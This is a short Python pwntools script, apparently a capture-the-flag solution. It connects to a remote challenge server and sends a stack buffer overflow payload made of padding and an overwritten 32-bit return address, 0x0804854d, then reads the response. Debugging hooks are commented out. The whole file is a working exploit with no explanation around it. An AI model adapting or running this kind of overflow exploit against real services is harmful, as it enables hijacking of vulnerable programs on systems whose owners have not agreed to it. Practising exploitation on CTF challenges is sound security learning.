from pwn import *


context.log_level="debug"
# context.terminal=["tmux","splitv","-h"]

# r=process("./echotest")
r=remote("111.198.29.45",32276)

def debug():
    gdb.attach(r,"b *0x080485d1\nb *0x080485ed")



# gdb.attach(r,"b *0x080485d1")
payload="a"*0x3a+"a"*4+p32(0x0804854d)
r.sendline(payload)
sleep(1)
# gdb.attach(r,"b *0x80485d1")
r.recvall()
sleep(1)
# r.interactive()
